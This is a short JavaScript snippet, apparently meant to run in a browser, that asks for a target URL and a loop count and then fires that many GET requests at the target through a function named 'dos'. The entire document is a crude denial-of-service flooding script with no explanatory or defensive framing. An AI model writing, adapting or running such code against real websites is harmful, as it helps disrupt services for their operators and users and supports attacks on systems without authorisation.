url = prompt("Url: ");
i =prompt("Loop: ");
function dos(url){
var xhr = new XMLHttpRequest();
xhr.open('GET',"//"+url, true);
xhr.send();
}
function loop(i){
  for(var x=1;x<i;x++){
    dos(url);
  }
}
loop(i)  


